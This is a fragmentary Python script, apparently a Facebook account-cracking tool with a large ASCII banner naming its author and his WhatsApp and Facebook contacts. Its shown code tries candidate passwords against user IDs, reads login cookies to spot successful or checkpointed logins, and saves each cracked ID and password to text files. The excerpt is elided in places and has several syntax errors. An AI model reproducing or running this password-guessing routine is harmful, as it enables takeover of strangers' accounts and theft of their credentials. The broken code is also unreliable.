...
os.system('xdg-open http://wa.me/+923007517496)
...
import uuid
import os,sys,time,json,random,re,string,platform,base64
os.system('xdg-open https://www.facebook.com/profile.php?id=100087338147208')
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
...
logo=("""
  ...
  ─────────────────────────────────────────────────
  JJJJJJJJJJJ iiii                               d::::::d                                              hhhhhhh               iiii       
          J:::::::::Ji::::i                              d::::::d                                              h:::::h              i::::i      
          J:::::::::J iiii                               d::::::d                                              h:::::h               iiii       
          JJ:::::::JJ                                    d:::::d                                               h:::::h                          
            J:::::J iiiiiiinnnn  nnnnnnnn        ddddddddd:::::d         mmmmmmm    mmmmmmm     aaaaaaaaaaaaa   h::::h hhhhh       iiiiiii      
            J:::::J i:::::in:::nn::::::::nn    dd::::::::::::::d       mm:::::::m  m:::::::mm   a::::::::::::a  h::::hh:::::hhh    i:::::i      
            J:::::J  i::::in::::::::::::::nn  d::::::::::::::::d      m::::::::::mm::::::::::m  aaaaaaaaa:::::a h::::::::::::::hh   i::::i      
            J:::::j  i::::inn:::::::::::::::nd:::::::ddddd:::::d      m::::::::::::::::::::::m           a::::a h:::::::hhh::::::h  i::::i      
            J:::::J  i::::i  n:::::nnnn:::::nd::::::d    d:::::d      m:::::mmm::::::mmm:::::m    aaaaaaa:::::a h::::::h   h::::::h i::::i      
JJJJJJJ     J:::::J  i::::i  n::::n    n::::nd:::::d     d:::::d      m::::m   m::::m   m::::m  aa::::::::::::a h:::::h     h:::::h i::::i      
J:::::J     J:::::J  i::::i  n::::n    n::::nd:::::d     d:::::d      m::::m   m::::m   m::::m a::::aaaa::::::a h:::::h     h:::::h i::::i      
J::::::J   J::::::J  i::::i  n::::n    n::::nd:::::d     d:::::d      m::::m   m::::m   m::::ma::::a    a:::::a h:::::h     h:::::h i::::i      
J:::::::JJJ:::::::J i::::::i n::::n    n::::nd::::::ddddd::::::dd     m::::m   m::::m   m::::ma::::a    a:::::a h:::::h     h:::::hi::::::i     
 JJ:::::::::::::JJ  i::::::i n::::n    n::::n d:::::::::::::::::d     m::::m   m::::m   m::::ma:::::aaaa::::::a h:::::h     h:::::hi::::::i     
   JJ:::::::::JJ    i::::::i n::::n    n::::n  d:::::::::ddd::::d     m::::m   m::::m   m::::m a::::::::::aa:::ah:::::h     h:::::hi::::::i     
     JJJJJJJJJ      iiiiiiii nnnnnn    nnnnnn   ddddddddd   ddddd     mmmmmm   mmmmmm   mmmmmm  aaaaaaaaaa  aaaahhhhhhh     hhhhhhhiiiiiiii     
  ...
  ─────────────────────────────────────────────────    
\33[1;37m----------------------------------------------
→   Owner      :  Muhammad Akhtar 
→  Facebook :  Muhammad Akhtar 
→WHATSAPP : 03007517496
→   Tools       :  RANDOM 
...
def riaz():
	...
	if riaz1 =='5':
		riaz()
	if riaz1 =='4':
		os.system('xdg-open http://wa.me/+923007517496text=SN.JAN💜🐰Sir😪💕')
	if riaz1 =='3':
		os.system('xdg-openhttps://www.facebook.com/Pak.Hacker.Muhammad.Akhtar');riaz()
	if riaz1 =='2':
		bangla()
	else:
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[151:166]
                print('\033[1;32m[AKHTAR-OK] '+cid+'|'+ps+'\033[0;97m')
                open('AKHTAR-OK.txt', 'a').write(cid+' | '+ps+ '\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:152]
                print('\033[1;31m[' AKHTAR-CP] '+uid+' | '+ps+'\x1b[1;97m')
                open('AKHTAR-CP.txt', 'a').write(uid+' | '+ps+'\n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r[\033[1;97m MUHAMMAD -AKHTAR\033[1;97m] %s|\33[1;32mOK:- %s \r'%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
